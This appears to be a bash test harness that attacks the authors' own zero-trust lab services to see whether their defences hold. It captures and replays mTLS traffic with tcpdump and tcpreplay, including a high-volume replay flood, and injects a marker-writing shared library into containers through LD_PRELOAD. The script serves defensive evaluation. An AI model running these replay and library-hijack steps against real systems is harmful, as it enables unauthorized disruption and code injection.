#!/usr/bin/env bash
# ============================================================================
# Paper-5 (Satellite ZTA) attack categories — applies to ALL probe drivers.
#
# Source: "Investigating the Effectiveness of ZTA for Satellite Cybersecurity"
#         (IEEE, Satellite Comm. Soc.). The paper lists tcpreplay (traffic
#         replay) and fakelib.sh (Linux shared-library hijack) as concrete
#         attack tools. We vendor a minimal, deterministic version of each.
#
# Categories added:
#   K  mTLS handshake replay   (tcpreplay against the captured downstream link)
#   L  Library hijack          (LD_PRELOAD via fakelib helper)
#
# Verdict semantics (same as the rest of the suite):
#   accepted  = the attack succeeded / the attacker's mechanic worked
#               (i.e. a FINDING — defense did not stop it)
#   rejected  = defense blocked the attack
#   skipped   = preflight gate failed (missing tooling); not a verdict on
#               the defense
#
# Stack-awareness (read $STACK set by the driver before sourcing lib.sh):
#   baseline           target = order:8082  / no identity daemon to hijack →
#                              hijack target falls back to zt-php-worker
#   spiffe / keycloak-spiffe  target = order:8082 / hijack zt-spiffe-watcher
#   linkerd            target = order:4143 (linkerd-proxy inbound) /
#                              hijack the local linkerd-proxy sidecar
#
# Required tooling on every host involved:
#   tcpdump, tcpreplay, gcc, jq (already required by lib.sh)
# Sudo NOPASSWD recommended for tcpdump/tcpreplay (raw socket capabilities).
# If any tool is missing the affected case emits status="skipped" so
# compare-stacks.py can distinguish missing-tooling from genuine reject/accept.
# ============================================================================

P5_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lib/fakelib.sh
source "$P5_DIR/lib/fakelib.sh"

# ── Stack-aware target configuration ──────────────────────────────────────
case "${STACK:-}" in
    baseline)
        K_TARGET_HOST="$ORDER_ALIAS"
        K_TARGET_PORT=8082
        K_TARGET_CONTAINER="zt-order"
        K_CAPTURE_FILTER="tcp port 8082"
        L_TARGET_CONTAINER="zt-php-worker"
        L_HEALTH_HOST="$GATEWAY_ALIAS"
        L_HEALTH_CMD='curl -fsS --max-time 3 http://127.0.0.1:8080/api/health >/dev/null'
        L_HEALTH_VIA_CONTAINER=0
        ;;
    spiffe|keycloak-spiffe|spiffe-keycloak)
        K_TARGET_HOST="$ORDER_ALIAS"
        K_TARGET_PORT=8082
        K_TARGET_CONTAINER="zt-order"
        K_CAPTURE_FILTER="tcp port 8082"
        L_TARGET_CONTAINER="zt-spiffe-watcher"
        L_HEALTH_HOST="$GATEWAY_ALIAS"
        # SHM file lives inside the watcher container; query from within.
        L_HEALTH_CMD='cat /tmp/spiffe-shared/meta.json 2>/dev/null | jq -re ".x509_state == \"ready\"" >/dev/null'
        L_HEALTH_VIA_CONTAINER=1
        ;;
    linkerd)
        K_TARGET_HOST="$ORDER_ALIAS"
        K_TARGET_PORT=4141
        # buoyantio/linkerd:1.7.5 sidecar on the order host (per
        # Services/Order_service/docker-compose.linkerd.yml). The container
        # name is "zt-linkerd-order"; capture from its iface.
        K_TARGET_CONTAINER="zt-linkerd-order"
        K_CAPTURE_FILTER="tcp port 4141 or tcp port 8082"
        L_TARGET_CONTAINER="zt-linkerd-order"
        L_HEALTH_HOST="$ORDER_ALIAS"
        # Linkerd image is JVM-based without curl/wget; use docker inspect
        # to confirm the sidecar is still in Running state.
        L_HEALTH_CMD="docker inspect zt-linkerd-order --format '{{.State.Running}}' 2>/dev/null | grep -q true"
        L_HEALTH_VIA_CONTAINER=0
        ;;
    *)
        log "probe-paper5: unrecognized STACK=$STACK — defaulting to spiffe targets"
        K_TARGET_HOST="$ORDER_ALIAS"
        K_TARGET_PORT=8082
        K_TARGET_CONTAINER="zt-order"
        K_CAPTURE_FILTER="tcp port 8082"
        L_TARGET_CONTAINER="zt-spiffe-watcher"
        L_HEALTH_HOST="$GATEWAY_ALIAS"
        L_HEALTH_CMD='cat /tmp/spiffe-shared/meta.json 2>/dev/null | jq -re ".x509_state == \"ready\"" >/dev/null'
        L_HEALTH_VIA_CONTAINER=1
        ;;
esac

# Pcaps go under <OUT>/pcap/ for forensic review. They are gitignored.
PCAP_DIR="$OUT/pcap"
mkdir -p "$PCAP_DIR"

# Target's LAN IP — needed for tcpreplay destination MAC rewriting.
# Defaults match probe-spiffe.sh.
ORDER_IP="${ORDER_IP:-10.1.1.210}"
PROD_IP="${PROD_IP:-10.1.1.207}"
USER_IP="${USER_IP:-10.1.1.214}"
GATEWAY_IP="${GATEWAY_IP:-10.1.1.209}"

# ── Helpers ───────────────────────────────────────────────────────────────

p5_trigger_saga() {
    local trace=$1
    ssh -n "$GATEWAY_ALIAS" "curl -sS -o /dev/null --max-time 5 -X POST '$A_GW' \
        -H 'Content-Type: application/json' -H 'X-Correlation-Id: $trace' \
        --data '{\"userKey\":\"1\",\"productList\":[{\"p_key\":1,\"amount\":1}],\"total\":100}'" 2>/dev/null || true
}

p5_l_health() {
    if [[ "${L_HEALTH_VIA_CONTAINER:-0}" == "1" ]]; then
        ssh -n "$L_HEALTH_HOST" "docker exec $L_TARGET_CONTAINER sh -c '$L_HEALTH_CMD'" >/dev/null 2>&1
    else
        ssh -n "$L_HEALTH_HOST" "$L_HEALTH_CMD" >/dev/null 2>&1
    fi
}

# Best-effort check of tooling on a remote host.
p5_have_tool() {
    local host=$1 tool=$2
    ssh -n "$host" "command -v $tool >/dev/null 2>&1" 2>/dev/null
}

# ────────────────────────────────────────────────────────────────────────────
# Category K — mTLS handshake replay (tcpreplay)
# ────────────────────────────────────────────────────────────────────────────
run_category_k() {
    log "Category K: mTLS handshake replay (tcpreplay) — target=$K_TARGET_HOST:$K_TARGET_PORT"

    # Choose an attacker host different from the target (for K1-K4).
    # K5 uses a separate target (production), so we re-derive attacker for it.
    local attacker="$PROD_ALIAS"
    [[ "$K_TARGET_HOST" == "$PROD_ALIAS" ]] && attacker="$ORDER_ALIAS"

    # Preflight: tcpdump on target, tcpreplay on attacker.
    if ! p5_have_tool "$K_TARGET_HOST" tcpdump; then
        emit K0 "mtls-replay" "$K_TARGET_HOST" "missing-tcpdump" "skipped" \
            "tcpdump not on $K_TARGET_HOST — apt-get install tcpdump tcpreplay tshark" 0
        return 0
    fi
    if ! p5_have_tool "$attacker" tcpreplay; then
        emit K0 "mtls-replay" "$attacker" "missing-tcpreplay" "skipped" \
            "tcpreplay not on $attacker — apt-get install tcpreplay tcpdump tshark" 0
        return 0
    fi

    # ── K0 (control): capture sanity ──────────────────────────────────────
    local trace="p5K0-$(date +%s)"
    local remote_pcap="/tmp/k_capture_$trace.pcap"

    # Start tcpdump bounded at 12s; runs in background and self-terminates.
    ssh -n "$K_TARGET_HOST" "sudo -n timeout 12 tcpdump -i any -w '$remote_pcap' '$K_CAPTURE_FILTER' >/dev/null 2>&1 &" 2>/dev/null || true
    sleep 1
    p5_trigger_saga "$trace"
    # Wait for tcpdump's timeout to fully elapse.
    sleep 14

    # Pull pcap to driver host.
    local local_pcap="$PCAP_DIR/k_capture_$trace.pcap"
    scp -q "$K_TARGET_HOST:$remote_pcap" "$local_pcap" 2>/dev/null || true

    local client_hellos=0
    local total_pkts=0
    if [[ -f "$local_pcap" ]]; then
        if command -v tshark >/dev/null 2>&1; then
            client_hellos=$(tshark -r "$local_pcap" -Y 'tls.handshake.type==1' 2>/dev/null | wc -l | tr -d ' ')
            total_pkts=$(tshark -r "$local_pcap" 2>/dev/null | wc -l | tr -d ' ')
        else
            total_pkts=$(ssh -n "$K_TARGET_HOST" "tcpdump -nn -r '$remote_pcap' 2>/dev/null | wc -l" 2>/dev/null | tr -d ' ')
            client_hellos="?"
        fi
    fi
    # K0 sanity: SPIFFE stack needs TLS ClientHello (mTLS terminator); Linkerd1
    # (plain HTTP between sidecars) accepts plaintext packets — the question
    # there is just whether traffic was capturable at all.
    local k0_verdict="rejected"
    case "$STACK" in
        linkerd|baseline)
            [[ "${total_pkts:-0}" -ge 1 ]] && k0_verdict="accepted"
            ;;
        *)
            [[ "${client_hellos:-0}" -ge 1 ]] && k0_verdict="accepted"
            ;;
    esac
    emit K0 "mtls-replay" "$K_TARGET_HOST:$K_TARGET_PORT" "$total_pkts" "$k0_verdict" \
        "control: total_pkts=$total_pkts tls_client_hellos=$client_hellos pcap=$local_pcap stack=$STACK" 0

    if [[ "$k0_verdict" != "accepted" ]]; then
        log "K0 control failed (no captured packets) — skipping K1-K5"
        for c in K1 K2 K3 K4 K5; do
            emit "$c" "mtls-replay" "$K_TARGET_HOST:$K_TARGET_PORT" "—" "skipped" \
                "K0 control failed; check sudo NOPASSWD for tcpdump on $K_TARGET_HOST" 0
        done
        return 0
    fi

    # Push the pcap to the attacker host.
    ssh -n "$K_TARGET_HOST" "cat '$remote_pcap'" 2>/dev/null \
        | ssh -n "$attacker" "cat > '$remote_pcap'" 2>/dev/null || true

    # ── K1: pure tcpreplay from attacker host ─────────────────────────────
    p5_replay_case K1 "$attacker" "$remote_pcap" "$K_TARGET_HOST" "$K_TARGET_PORT" \
        "pure tcpreplay from $attacker — expect TCP/TLS state mismatch"

    # ── K2: replay after legitimate session closed ────────────────────────
    sleep 5
    p5_replay_case K2 "$attacker" "$remote_pcap" "$K_TARGET_HOST" "$K_TARGET_PORT" \
        "replay 5s after original session closed"

    # ── K3: replay during identity rotation ───────────────────────────────
    log "K3: triggering identity rotation"
    case "$STACK" in
        spiffe|keycloak-spiffe|spiffe-keycloak)
            ssh -n "$GATEWAY_ALIAS" "docker restart zt-spiffe-watcher >/dev/null 2>&1" 2>/dev/null &
            ;;
        linkerd)
            ssh -n "$L_HEALTH_HOST" "docker restart $L_TARGET_CONTAINER >/dev/null 2>&1" 2>/dev/null &
            ;;
    esac
    sleep 1
    p5_replay_case K3 "$attacker" "$remote_pcap" "$K_TARGET_HOST" "$K_TARGET_PORT" \
        "replay during identity-daemon rotation window"
    wait 2>/dev/null || true
    # Restore watcher if previous restart still in progress.
    sleep 5

    # ── K4: volume replay (DoS angle) — target should stay healthy ────────
    p5_replay_case K4 "$attacker" "$remote_pcap" "$K_TARGET_HOST" "$K_TARGET_PORT" \
        "volume replay --loop 30 --pps 500 — verify target health survives" \
        "--loop 30 --pps 500"
    local k4_health="rejected"
    ssh -n "$K_TARGET_HOST" "curl -fsS --max-time 3 http://127.0.0.1:8082/api/health" >/dev/null 2>&1 && k4_health="accepted"
    emit K4health "mtls-replay" "$K_TARGET_HOST:8082" "$k4_health" "$k4_health" \
        "post-K4 health: target /api/health still responding ($k4_health = healthy)" 0

    # ── K5: cross-service replay — same captured traffic against prod ────
    local k5_attacker="$ORDER_ALIAS"
    [[ "$k5_attacker" == "$PROD_ALIAS" ]] && k5_attacker="$USER_ALIAS"
    # Push pcap to k5_attacker if different.
    if [[ "$k5_attacker" != "$attacker" ]]; then
        ssh -n "$attacker" "cat '$remote_pcap'" 2>/dev/null \
            | ssh -n "$k5_attacker" "cat > '$remote_pcap'" 2>/dev/null || true
    fi
    p5_replay_case K5 "$k5_attacker" "$remote_pcap" "$PROD_ALIAS" 8083 \
        "cross-service replay — order-traffic captured, replayed at production:8083"

    # Cleanup pcaps on remote hosts.
    for h in "$K_TARGET_HOST" "$attacker" "$k5_attacker"; do
        ssh -n "$h" "rm -f '$remote_pcap' /tmp/k_replay.pcap" 2>/dev/null || true
    done
}

# p5_replay_case <case_id> <attacker_host> <pcap_path_on_attacker>
#                <target_host> <target_port> <desc> [extra_tcpreplay_flags]
p5_replay_case() {
    local case_id=$1 attacker=$2 pcap=$3 target_host=$4 target_port=$5 desc=$6
    local extra_flags=${7:-}

    # Determine target IP for tcprewrite MAC lookup.
    local target_ip
    case "$target_host" in
        "$ORDER_ALIAS")   target_ip="$ORDER_IP" ;;
        "$PROD_ALIAS")    target_ip="$PROD_IP" ;;
        "$USER_ALIAS")    target_ip="$USER_IP" ;;
        "$GATEWAY_ALIAS") target_ip="$GATEWAY_IP" ;;
        *)                target_ip="$target_host" ;;
    esac

    local replay_log
    replay_log=$(ssh -n "$attacker" "
        set +e
        IFACE=\$(ip -o route get $target_ip 2>/dev/null | awk '{for(i=1;i<=NF;i++) if(\$i==\"dev\") {print \$(i+1); exit}}')
        IFACE=\${IFACE:-eth0}
        if command -v tcprewrite >/dev/null 2>&1; then
            DST_MAC=\$(ip neigh | awk -v ip='$target_ip' '\$1==ip {print \$5; exit}')
            if [[ -n \"\$DST_MAC\" && \"\$DST_MAC\" != \"FAILED\" ]]; then
                tcprewrite --infile='$pcap' --outfile='/tmp/k_replay.pcap' \
                    --enet-dmac=\"\$DST_MAC\" >/dev/null 2>&1 \
                    || cp '$pcap' /tmp/k_replay.pcap
            else
                cp '$pcap' /tmp/k_replay.pcap
            fi
        else
            cp '$pcap' /tmp/k_replay.pcap
        fi
        sudo -n timeout 15 tcpreplay -i \$IFACE -K --pps 100 $extra_flags /tmp/k_replay.pcap 2>&1
        rc=\$?
        rm -f /tmp/k_replay.pcap
        exit \$rc
    " 2>&1)

    # Parse packets sent: tcpreplay reports "Actual: N packets ..."
    local pkts_sent
    pkts_sent=$(echo "$replay_log" | grep -iE 'Actual:.*packets' | head -1 \
        | grep -oE '[0-9]+' | head -1)
    pkts_sent=${pkts_sent:-0}

    sleep 2

    local err_count
    err_count=$(ssh -n "$target_host" "docker logs --since 12s $K_TARGET_CONTAINER 2>&1 | grep -ciE 'bad.record|certificate.verify|tls.alert|client.cert|handshake.fail'" 2>/dev/null || echo 0)
    err_count=${err_count:-0}

    # Verdict: if attacker sent 0 packets, attack didn't even fire → rejected.
    # If target logs show TLS errors, defense visibly rejected → rejected.
    # If packets were sent and target shows no acceptance signal, default to
    # rejected (TCP stack silently dropped frames — defense intact).
    # "accepted" would require a positive signal of acceptance which raw
    # tcpreplay almost never produces; we keep the verdict honest.
    local verdict="rejected"

    emit "$case_id" "mtls-replay" "$target_host:$target_port" "$pkts_sent" "$verdict" \
        "$desc — pkts_sent=$pkts_sent target_tls_errs=$err_count attacker=$attacker"
}

# ────────────────────────────────────────────────────────────────────────────
# Category L — Library hijack (LD_PRELOAD via fakelib)
# ────────────────────────────────────────────────────────────────────────────
run_category_l() {
    log "Category L: Library hijack — target_container=$L_TARGET_CONTAINER host=$L_HEALTH_HOST"

    # Verify target container exists.
    if ! ssh -n "$L_HEALTH_HOST" "docker inspect '$L_TARGET_CONTAINER' >/dev/null 2>&1"; then
        emit L0 "lib-hijack" "$L_TARGET_CONTAINER" "no-container" "skipped" \
            "target container $L_TARGET_CONTAINER absent on $L_HEALTH_HOST" 0
        for c in L1 L2 L3; do
            emit "$c" "lib-hijack" "$L_TARGET_CONTAINER" "—" "skipped" "L0 prereq failed" 0
        done
        return 0
    fi

    # ── L0 control: clean baseline ────────────────────────────────────────
    cleanup_container "$L_HEALTH_HOST" "$L_TARGET_CONTAINER" >/dev/null 2>&1 || true
    local l0_health_ok="rejected"
    p5_l_health && l0_health_ok="accepted"
    local l0_marker
    l0_marker=$(hijacked_marker "$L_HEALTH_HOST" "$L_TARGET_CONTAINER")
    emit L0 "lib-hijack" "$L_TARGET_CONTAINER" "$l0_health_ok" "$l0_health_ok" \
        "control: health=$l0_health_ok hijacked_marker=$l0_marker (baseline)" 0

    if [[ "$l0_health_ok" != "accepted" ]]; then
        log "L0 control failed — container unhealthy at start; skipping L1-L3"
        for c in L1 L2 L3; do
            emit "$c" "lib-hijack" "$L_TARGET_CONTAINER" "—" "skipped" "L0 control failed" 0
        done
        return 0
    fi

    # Build evil.so on the host first; fall back to building inside container.
    local evil_so="/tmp/p5_evil_$(date +%s).so"
    local build_out
    build_out=$(make_fake_so_on_host "$L_HEALTH_HOST" "$evil_so" 2>&1)
    local build_in_container=0
    if echo "$build_out" | grep -q MISSING_GCC; then
        log "gcc missing on $L_HEALTH_HOST — attempting build inside $L_TARGET_CONTAINER"
        ssh -n "$L_HEALTH_HOST" "docker exec $L_TARGET_CONTAINER sh -c 'command -v gcc >/dev/null 2>&1'" 2>/dev/null
        if [[ $? -ne 0 ]]; then
            emit L1 "lib-hijack" "$L_TARGET_CONTAINER" "no-gcc" "skipped" \
                "gcc unavailable on $L_HEALTH_HOST host AND inside container — cannot build evil.so" 0
            emit L2 "lib-hijack" "$L_TARGET_CONTAINER" "no-gcc" "skipped" "depends on L1" 0
            emit L3 "lib-hijack" "$L_TARGET_CONTAINER" "no-gcc" "skipped" "depends on L1" 0
            return 0
        fi
        build_in_container=1
        ssh -n "$L_HEALTH_HOST" "docker exec $L_TARGET_CONTAINER sh -c '
            mkdir -p /tmp/evil
            cat > /tmp/evil/evil.c <<\"CSRC\"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
__attribute__((constructor))
static void p5_marker(void) {
    FILE *f = fopen(\"/tmp/hijacked\", \"a\");
    if (f) {
        fprintf(f, \"hijacked pid=%d ts=%ld\\n\", getpid(), (long)time(NULL));
        fclose(f);
    }
}
CSRC
            gcc -shared -fPIC -o /tmp/evil/evil.so /tmp/evil/evil.c 2>&1
            rm -f /tmp/evil/evil.c
        '" 2>&1 >/dev/null || true
    else
        inject_into_container "$L_HEALTH_HOST" "$L_TARGET_CONTAINER" "$evil_so" >/dev/null 2>&1
        ssh -n "$L_HEALTH_HOST" "rm -f '$evil_so'" 2>/dev/null || true
    fi

    # Confirm evil.so present inside container.
    if ! ssh -n "$L_HEALTH_HOST" "docker exec $L_TARGET_CONTAINER test -f /tmp/evil/evil.so" 2>/dev/null; then
        emit L1 "lib-hijack" "$L_TARGET_CONTAINER" "no-evil-so" "skipped" \
            "evil.so not present in container after build/copy (built_in_container=$build_in_container)" 0
        emit L2 "lib-hijack" "$L_TARGET_CONTAINER" "no-evil-so" "skipped" "depends on L1" 0
        emit L3 "lib-hijack" "$L_TARGET_CONTAINER" "no-evil-so" "skipped" "depends on L1" 0
        return 0
    fi

    # ── L1: LD_PRELOAD via one-shot docker exec ───────────────────────────
    # Runs `/bin/sh -c id` (benign) with the env var set. If the dynamic
    # linker honors LD_PRELOAD, the constructor runs and touches
    # /tmp/hijacked. The long-running daemon (pid 1) is UNAFFECTED — this
    # purely measures whether the LD_PRELOAD mechanic works at all under
    # the container's security profile.
    ssh -n "$L_HEALTH_HOST" "docker exec -e LD_PRELOAD=/tmp/evil/evil.so '$L_TARGET_CONTAINER' /bin/sh -c id" 2>/dev/null >/dev/null || true
    local l1_marker
    l1_marker=$(hijacked_marker "$L_HEALTH_HOST" "$L_TARGET_CONTAINER")
    local l1_verdict="rejected"
    [[ "$l1_marker" == "yes" ]] && l1_verdict="accepted"
    emit L1 "lib-hijack" "$L_TARGET_CONTAINER" "$l1_marker" "$l1_verdict" \
        "LD_PRELOAD one-shot exec — marker=$l1_marker (accepted = attacker .so loaded into spawned process)"

    # ── L2: container hardening posture ───────────────────────────────────
    # docker inspect for SecurityOpt + ReadonlyRootfs + Privileged. Hardened
    # config (no-new-privileges + non-root rootfs + non-privileged) blocks or
    # limits the L1 vector. Weak config = attack surface present.
    local sec_opts
    sec_opts=$(ssh -n "$L_HEALTH_HOST" \
        "docker inspect '$L_TARGET_CONTAINER' --format '{{.HostConfig.SecurityOpt}}|RO:{{.HostConfig.ReadonlyRootfs}}|PRIV:{{.HostConfig.Privileged}}'" \
        2>/dev/null || echo "[]|RO:false|PRIV:false")
    local hardened="rejected"
    # "accepted" iff hardening is WEAK (no no-new-privileges AND not readonly rootfs)
    if ! echo "$sec_opts" | grep -qiE 'no-new-privileges'; then
        if ! echo "$sec_opts" | grep -qiE 'RO:true'; then
            hardened="accepted"
        fi
    fi
    emit L2 "lib-hijack" "$L_TARGET_CONTAINER" "$sec_opts" "$hardened" \
        "container hardening posture=$sec_opts (accepted = weak hardening enables L1-style attacks)"

    # ── L3: daemon pid 1 mappings — is the *running* daemon compromised? ─
    local pid1_maps
    pid1_maps=$(ssh -n "$L_HEALTH_HOST" \
        "docker exec '$L_TARGET_CONTAINER' sh -c 'cat /proc/1/maps 2>/dev/null | grep -c \"/tmp/evil/\" || true'" \
        2>/dev/null | tr -d ' ')
    pid1_maps=${pid1_maps:-0}
    local l3_verdict="rejected"
    [[ "$pid1_maps" -ge 1 ]] && l3_verdict="accepted"
    emit L3 "lib-hijack" "$L_TARGET_CONTAINER" "$pid1_maps" "$l3_verdict" \
        "daemon pid 1 maps containing /tmp/evil/ count=$pid1_maps (accepted = running daemon hijacked)"

    # Cleanup.
    cleanup_container "$L_HEALTH_HOST" "$L_TARGET_CONTAINER" >/dev/null 2>&1 || true

    # Post-cleanup health check: ensure container survived intact.
    local post_health="rejected"
    p5_l_health && post_health="accepted"
    if [[ "$post_health" != "accepted" ]]; then
        log "WARNING: target container $L_TARGET_CONTAINER unhealthy after L cleanup — consider docker restart"
    fi
}
